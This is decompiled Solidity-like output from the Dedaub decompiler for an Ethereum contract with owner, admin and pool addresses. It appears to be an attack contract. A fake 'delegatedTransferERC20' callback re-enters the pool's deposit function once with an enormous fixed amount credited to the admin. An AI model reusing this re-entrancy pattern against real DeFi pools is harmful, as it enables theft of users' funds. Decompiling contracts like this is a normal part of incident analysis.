// Decompiled by library.dedaub.com
// 2022.12.19 13:09 UTC

// Data structures and variables inferred from the use of storage instructions
uint256 _count; // STORAGE[0x2]
address _owner; // STORAGE[0x0] bytes 0 to 19
address _pool; // STORAGE[0x1] bytes 0 to 19
uint160 _admin; // STORAGE[0x3] bytes 0 to 19

// Events
OwnershipRenounced(address);
OwnershipTransferred(address, address);

function 0x4a0b0c38() public payable { 
    0x28e();
}

function renounceOwnership() public payable { 
    require(msg.sender == _owner);
    emit OwnershipRenounced(_owner);
    _owner = 0;
}

function owner() public payable { 
    return _owner;
}

function isOwner() public payable { 
    return msg.sender == _owner;
}

function transferOwnership(address varg0) public payable { 
    require(msg.data.length - 4 >= 32);
    require(msg.sender == _owner);
    require(varg0 != 0);
    emit OwnershipTransferred(_owner, varg0);
    _owner = varg0;
}

function admin() public payable { 
    return _admin;
}

function 0x28e() private { 
    require(_pool.code.size);
    v0, v1 = _pool.deposit(0x52b7d2dcc80cd2e4000000, address(this), _admin).gas(msg.gas);
    require(v0); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    return ;
}

function () public payable { 
    revert();
}

function count() public payable { 
    return _count;
}

function pool() public payable { 
    return _pool;
}

function delegatedTransferERC20(address varg0, address varg1, uint256 varg2) public payable { 
    require(msg.data.length - 4 >= 96);
    _count += 1;
    if (_count < 2) {
        0x28e();
    }
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    require(!msg.value);
    if (msg.data.length < 4) {
        ();
    } else if (0x715018a6 > function_selector >> 224) {
        if (0x6661abd == function_selector >> 224) {
            count();
        } else if (0x16f0115b == function_selector >> 224) {
            pool();
        } else if (0x2e88fb97 == function_selector >> 224) {
            delegatedTransferERC20(address,address,uint256);
        } else {
            require(0x4a0b0c38 == function_selector >> 224);
            0x4a0b0c38();
        }
    } else if (0x715018a6 == function_selector >> 224) {
        renounceOwnership();
    } else if (0x8da5cb5b == function_selector >> 224) {
        owner();
    } else if (0x8f32d59b == function_selector >> 224) {
        isOwner();
    } else if (0xf2fde38b == function_selector >> 224) {
        transferOwnership(address);
    } else {
        require(0xf851a440 == function_selector >> 224);
        admin();
    }
}
